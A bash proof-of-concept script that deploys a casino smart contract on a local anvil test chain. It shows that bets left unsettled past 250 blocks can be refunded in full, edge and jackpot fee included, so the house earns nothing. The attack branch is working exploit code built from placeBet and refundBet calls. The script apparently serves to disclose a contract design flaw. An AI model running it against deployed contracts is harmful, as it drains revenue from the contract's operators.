#!/usr/bin/env bash
# poc/refund-only.sh
#
# "The house cannot win if we wait 250 blocks" — demonstrated with placeBet and
# refundBet ONLY. settleBet appears here as the house's defence, never as part of the
# attack: the PoC shows what the defence is worth and what happens when it is not used.
#
#   ./poc/refund-only.sh
#
# Two identical 1 ETH bets on a game that always pays 2x:
#
#   A (control)  settled at N+1  -> the house pays 1.978, free bankroll drops 0.979
#   B (attack)   left alone      -> refund at N+251 returns the FULL stake, including
#                                   the 1% edge and the 0.001 jackpot fee; the house's
#                                   free bankroll is unchanged
#
# The claim: the house's edge is not enforceable. It collects only what it settles
# inside 250 blocks, and a missed settlement is unrecoverable — refundBet pays
# totalAmount, so the edge comes back to the gambler too.
#
# Requires anvil, cast, forge. Exits non-zero on the first surprise.

set -euo pipefail
cd "$(dirname "$0")/.."

RPC=${RPC:-http://127.0.0.1:8545}
PORT=${PORT:-8545}
OWNER_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
SIGNER_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
THIRD_KEY=0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
OWNER=$(cast wallet address --private-key $OWNER_KEY)
SIGNER=$(cast wallet address --private-key $SIGNER_KEY)
THIRD=$(cast wallet address --private-key $THIRD_KEY)

step() { printf '\n== %s\n' "$*"; }
fail() { printf 'FAILED: %s\n' "$*" >&2; exit 1; }
# cast returns decimal for some calls and hex for others; an error string parses to
# NaN and silently poisons every later comparison. Fail loudly instead.
dec() {
  local v=${1//[[:space:]]/}
  # Some cast versions annotate large values, e.g. "1000000000000000 [1e15]".
  v=${v%%\[*}
  v=${v%\]}
  case "$v" in
    0x*|0X*) cast to-dec "$v" 2>/dev/null || fail "cannot parse '$1' as a number" ;;
    '') fail "empty value where a number was expected" ;;
    *[!0-9]*) fail "cannot parse '$1' as a number" ;;
    *) echo "$v" ;;
  esac
}
wei()  { dec "$1"; }
eth()  { node -e 'console.log((Number(process.argv[1])/1e18).toFixed(6))' "$1"; }

step "chain"
if ! cast chain-id --rpc-url "$RPC" >/dev/null 2>&1; then
  echo "  starting anvil on $RPC"
  anvil --port "$PORT" --silent --gas-price 0 --base-fee 0 &
  ANVIL_PID=$!
  trap 'kill $ANVIL_PID 2>/dev/null || true' EXIT
  for _ in $(seq 1 50); do cast chain-id --rpc-url "$RPC" >/dev/null 2>&1 && break; sleep 0.2; done
fi
cast chain-id --rpc-url "$RPC" >/dev/null 2>&1 || fail "no chain at $RPC"
echo "  owner $OWNER"
echo "  signer $SIGNER"
echo "  third $THIRD  (refunds branch B, unrelated to the bet)"

step "build"
CASINO_SRC=${CASINO_SRC:-poc/forge/src/BlockChainCasino.sol}
[ -f "$CASINO_SRC" ] || fail "set CASINO_SRC=/path/to/BlockChainCasino.sol (the verified source)"
# Own forge root: building from the repo root walks test/fixtures/**, which needs solc
# 0.4.9-0.8.30 and forge-std remappings this repo does not have, and the build dies
# before reaching the PoC.
mkdir -p poc/forge/src
cp "$CASINO_SRC" poc/forge/src/BlockChainCasino.sol
cp poc/mocks/*.sol poc/forge/src/ 2>/dev/null || true
forge build --root poc/forge >/dev/null || fail "forge build --root poc/forge failed"

deploy() {
  local name=$1; shift
  local out
  out=$(forge create --root poc/forge --broadcast --rpc-url "$RPC" --private-key "$OWNER_KEY" \
        "$name" "$@" 2>&1) || { echo "$out" >&2; fail "deploy $name"; }
  echo "$out" | grep -oE 'Deployed to: 0x[a-fA-F0-9]{40}' | awk '{print $3}'
}

step "deploy"
CASINO=$(deploy BlockChainCasino)     # no constructor args
GAME=$(deploy MockGameWin)            # always pays 2x, so the branch is deterministic
echo "  casino $CASINO"
echo "  game   $GAME"

cast send --rpc-url "$RPC" --private-key "$OWNER_KEY" "$CASINO" "setSecretSigner(address)" "$SIGNER" >/dev/null
cast send --rpc-url "$RPC" --private-key "$OWNER_KEY" "$CASINO" "setGameContract(uint256,address)" 0 "$GAME" >/dev/null
cast send --rpc-url "$RPC" --private-key "$OWNER_KEY" "$CASINO" --value 20ether >/dev/null
echo "  bankroll 20 ETH, signer set, game 0 -> $GAME"

# free bankroll = balance - jackpotSize - lockedInBets
free_bankroll() {
  local bal jack locked
  bal=$(wei "$(cast balance "$CASINO" --rpc-url "$RPC")")
  jack=$(wei "$(cast call --rpc-url "$RPC" "$CASINO" "jackpotSize()(uint128)")")
  locked=$(wei "$(cast call --rpc-url "$RPC" "$CASINO" "lockedInBets()(uint128)")")
  node -e 'console.log((BigInt(process.argv[1]) - BigInt(process.argv[2]) - BigInt(process.argv[3])).toString())' "$bal" "$jack" "$locked"
}

# place_bet <reveal> -> echoes the commit
place_bet() {
  local reveal=$1
  local reveal_word commit last_block digest sig r s v
  reveal_word=$(printf '0x%064x' "$reveal")
  commit=$(cast keccak "$reveal_word")
  last_block=$(( $(cast block-number --rpc-url "$RPC") + 100 ))
  # abi.encodePacked(uint40 commitLastBlock, uint256 commit) is 5 + 32 = 37 bytes.
  # Padding commitLastBlock to a 32-byte word (as I first did) hashes a different
  # message and every signature fails ecrecover with "ECDSA signature is not valid".
  digest=$(cast keccak "$(printf '0x%010x' "$last_block")${commit#0x}")
  sig=$(cast wallet sign --no-hash --private-key "$SIGNER_KEY" "$digest"); sig=${sig#0x}
  r=0x${sig:0:64}; s=0x${sig:64:64}; v=$(cast to-dec 0x${sig:128:2})
  [ "$v" -ge 27 ] || v=$(( v + 27 ))
  # `|| return 1`: without it the trailing echo makes the function succeed even when
  # cast send failed, and the run continues against a bet that was never placed.
  cast send --rpc-url "$RPC" --private-key "$OWNER_KEY" "$CASINO" \
    "placeBet(uint8,uint256[],uint256[],uint8,uint256,uint256,uint8,bytes32,bytes32)" \
    0 "[1]" "[1000000000000000000]" 2 "$last_block" "$commit" "$v" "$r" "$s" \
    --value 1ether >/dev/null || return 1
  echo "$commit"
}

# Confirm the bet exists before relying on it. Without this, a failed placeBet shows up
# much later as "Wrong blockHash" from settleBet, because bet.placeBlockNumber is 0.
assert_bet_active() {
  local commit=$1 label=$2
  local n
  n=$(cast call --rpc-url "$RPC" "$CASINO" \
      "getBet(uint256)(uint256,uint256[],uint256,uint8,uint40,uint40[],uint8,address)" "$commit" \
      2>/dev/null | head -1)
  case "$n" in
    ""|0) fail "$label: no bet exists for commit $commit — placeBet did not land" ;;
  esac
  echo "  bet active: $n leg(s)"
}

start_free=$(free_bankroll)
echo "  free bankroll before any bet: $(eth "$start_free") ETH"

# ---------------------------------------------------------------- branch A ----
step "branch A (control): settle at N+1"
COMMIT_A=$(place_bet 111111) || fail "branch A: placeBet failed"
assert_bet_active "$COMMIT_A" "branch A"
PLACED_A=$(cast block-number --rpc-url "$RPC")
HASH_A=$(cast block "$PLACED_A" --field hash --rpc-url "$RPC")
after_place_free=$(free_bankroll)
echo "  placed in block $PLACED_A; free bankroll now $(eth "$after_place_free") ETH"
cast rpc --rpc-url "$RPC" anvil_mine 0x1 >/dev/null
settle_out=$(cast send --rpc-url "$RPC" --private-key "$OWNER_KEY" "$CASINO" \
  "settleBet(uint256,bytes32)" 111111 "$HASH_A" 2>&1) || { echo "$settle_out" >&2; fail "settleBet failed in branch A"; }
free_A=$(free_bankroll)
gambler_A=$(wei "$(cast balance "$OWNER" --rpc-url "$RPC")")
echo "  settled: free bankroll $(eth "$free_A") ETH"
node -e '
  const f = (x) => (Number(x) / 1e18).toFixed(6);
  const before = BigInt(process.argv[1]), after = BigInt(process.argv[2]);
  const lost = before - after;
  console.log(`  house lost ${f(lost)} ETH by settling a winner`);
  if (lost <= 0n) { console.error("  EXPECTED a loss — the mock pays 2x, so settling must cost the house"); process.exit(1); }
' "$start_free" "$free_A" || fail "branch A did not cost the house anything"

# ---------------------------------------------------------------- branch B ----
step "branch B (attack): placeBet, then refundBet. No settleBet."
base_B=$(free_bankroll)
base_bal_B=$(wei "$(cast balance "$CASINO" --rpc-url "$RPC")")
echo "  free bankroll before this bet: $(eth "$base_B") ETH"
COMMIT_B=$(place_bet 222222) || fail "branch B: placeBet failed"
assert_bet_active "$COMMIT_B" "branch B"
PLACED_B=$(cast block-number --rpc-url "$RPC")
HASH_B=$(cast block "$PLACED_B" --field hash --rpc-url "$RPC")
free_before_B=$(free_bankroll)
echo "  placed in block $PLACED_B; free bankroll $(eth "$free_before_B") ETH"

# placeBet's transaction is itself a block, so the current height is already B.
# Mining 249 lands on B+249; the window closes at B+250, which needs 250.
cast rpc --rpc-url "$RPC" anvil_mine $(printf '0x%x' 250) >/dev/null
NOW=$(cast block-number --rpc-url "$RPC")
[ "$NOW" -eq $((PLACED_B + 250)) ] || fail "expected block $((PLACED_B + 250)), at $NOW"
if cast call --rpc-url "$RPC" "$CASINO" "refundBet(uint256)" "$COMMIT_B" >/dev/null 2>&1; then
  fail "refundBet succeeded at N+250 — it must not"
fi
echo "  N+250: refundBet reverts (too early) — ok"

cast rpc --rpc-url "$RPC" anvil_mine 0x1 >/dev/null
if cast call --rpc-url "$RPC" "$CASINO" "settleBet(uint256,bytes32)" 222222 "$HASH_B" >/dev/null 2>&1; then
  fail "settleBet succeeded at N+251 — the winning bet must be unclaimable"
fi
echo "  N+251: settleBet reverts — the win is gone, even holding the reveal and the hash"

cast send --rpc-url "$RPC" --private-key "$THIRD_KEY" "$CASINO" "refundBet(uint256)" "$COMMIT_B" >/dev/null
free_B=$(free_bankroll)
bal_after_B=$(wei "$(cast balance "$CASINO" --rpc-url "$RPC")")
echo "  N+252: refundBet by an unrelated address succeeded"
echo "  free bankroll $(eth "$free_B") ETH"
echo "  casino balance back to $(eth "$bal_after_B") ETH (stake returned in full)"

if cast call --rpc-url "$RPC" "$CASINO" "refundBet(uint256)" "$COMMIT_B" >/dev/null 2>&1; then
  fail "a second refundBet succeeded — totalAmount should be 0"
fi
echo "  a second refundBet reverts — bet is processed"

# ---------------------------------------------------------------- verdict ----
step "verdict"
node -e '
  // BigInt throughout: these are wei, well past 2^53, and Number() would round them.
  const [start, freeA, baseB, freeB, balBefore, balAfter] = process.argv.slice(1, 7).map(BigInt);
  const f = (x) => (Number(x) / 1e18).toFixed(6);
  console.log(`  A  settled  : free bankroll ${f(freeA)}  (house lost ${f(start - freeA)})`);
  console.log(`  B  refunded : free bankroll ${f(freeB)}  (house lost ${f(baseB - freeB)})`);
  let ok = true;
  if (freeA >= start) { console.error("  EXPECTED settling a 2x winner to cost the house"); ok = false; }
  if (freeB !== baseB) { console.error("  EXPECTED the refunded branch to leave the house exactly where it started"); ok = false; }
  if (balAfter !== balBefore) { console.error("  EXPECTED the casino balance to return to its pre-bet level"); ok = false; }
  if (!ok) process.exit(1);
  console.log("");
  console.log("  => the house collects only what it settles inside 250 blocks. A missed");
  console.log("     settlement is unrecoverable, and refundBet pays totalAmount — the stake");
  console.log("     INCLUDING the 1% edge and the jackpot fee. On a refunded bet the house");
  console.log("     earns nothing at all, and the gambler breaks exactly even.");
' "$start_free" "$free_A" "$base_B" "$free_B" "$base_bal_B" "$bal_after_B" \
  || fail "the measured economics do not match the claim"
